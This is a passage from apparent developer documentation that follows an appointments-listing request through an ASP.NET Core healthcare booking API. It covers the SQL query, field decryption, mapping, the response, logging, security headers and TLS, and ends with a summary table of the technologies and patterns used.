- ORDER BY: `BookingDate ASC`
- INCLUDE: Patient, Provider, Service (eager loading)
- OFFSET: 0, FETCH NEXT: 20

### Step 13: Repository Execution
The repository applies the specification to an `IQueryable`, counts total results, then executes the query:
```sql
SELECT TOP 20 b.*, p.*, pr.*, s.*
FROM Bookings b
LEFT JOIN Patients p ON b.PatientId = p.Id
LEFT JOIN Providers pr ON b.ProviderId = pr.Id
LEFT JOIN Services s ON b.ServiceId = s.Id
WHERE b.PatientId = 'abc-123'
ORDER BY b.BookingDate ASC
```

### Step 14: EF Core Decryption
As EF Core reads each row, the **Value Converters** automatically decrypt:
- `"ABxCD123ef..."` → `"Ahmed Hassan"` (PatientName)
- `"XYZ789ab..."` → `"Dr. Sarah"` (ProviderName)

The decrypted entities are returned to the repository.

### Step 15: AutoMapper
`_mapper.Map<List<AppointmentResponse>>(items)` copies properties from `Booking` entities to `AppointmentResponse` DTOs. The mapper also maps nested objects (Patient → PatientSummary, etc.)

### Step 16: Response Wrapping
The controller wraps the result:
```json
{
  "success": true,
  "message": "Appointments retrieved successfully",
  "data": {
    "items": [
      {
        "id": "...",
        "bookingNumber": "BK-2026-001",
        "patientName": "Ahmed Hassan",
        "providerName": "Dr. Sarah",
        "status": "Confirmed",
        ...
      }
    ],
    "totalCount": 42,
    "pageNumber": 1,
    "pageSize": 20,
    "totalPages": 3,
    "hasNextPage": true,
    "hasPreviousPage": false
  }
}
```

### Step 17: Logging (Background)
Back in the logging middleware, the timer stops (e.g., 45ms). On a **separate thread**, it logs:
```
[Information] HTTP GET /api/v1/appointments responded 200 in 45.2ms | CorrelationId: a1b2c3d4
```
This is persisted to the `RequestLogs` table in `SanadPlatformLogsDb` via Serilog.

### Step 18: Security Headers (Response)
The security headers registered in Step 3 are now added to the response:
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Correlation-Id: a1b2c3d4
api-supported-versions: 1.0, 2.0
```

### Step 19: TLS Encryption (Response)
The JSON response is encrypted via TLS and sent to the client.

### Step 20: Client Renders
React receives the JSON, parses ` data.items`, and renders the appointments table with pagination controls.

---

## Summary of Technologies & Patterns

| Concern | Technology/Pattern | File(s) |
|---------|-------------------|---------|
| Architecture | Vertical Slice | Feature folder structure |
| HTTP Framework | ASP.NET Core 8 | `Program.cs` |
| Database ORM | Entity Framework Core | `SanadDbContext.cs` |
| Database | SQL Server | `appsettings.json` |
| Authentication | JWT Bearer | `Program.cs`, `ClaimsService.cs` |
| Authorization | RBAC (Role-Based) | `AppointmentService.cs` |
| API Versioning | URL Segment | `VersioningExtensions.cs` |
| Logging | Serilog + SQL Server | `RequestLoggingMiddleware.cs` |
| Encryption at Rest | AES-256-GCM | `EncryptionService.cs`, `EncryptedValueConverter.cs` |
| Encryption in Transit | TLS 1.2+ | `DataInTransitSecurityMiddleware.cs` |
| Password Hashing | BCrypt (work factor 12) | `PasswordHashingService.cs` |
| Input Sanitization | Regex-based | `DataSanitizationService.cs` |
| Query Building | Specification Pattern | `GetAppointmentsSpecification.cs` |
| Object Mapping | AutoMapper | `BookingMappingProfile.cs` |
| Validation | FluentValidation / Data Annotations | DTOs, `ValidationBehavior.cs` |
| CQRS | MediatR | Commands/, Queries/, Handlers/ |
| Dependency Injection | Built-in ASP.NET Core DI | `Program.cs` |
| Cross-Cutting Concerns | MediatR Pipeline Behaviors | `ValidationBehavior.cs`, `LoggingBehavior.cs` |
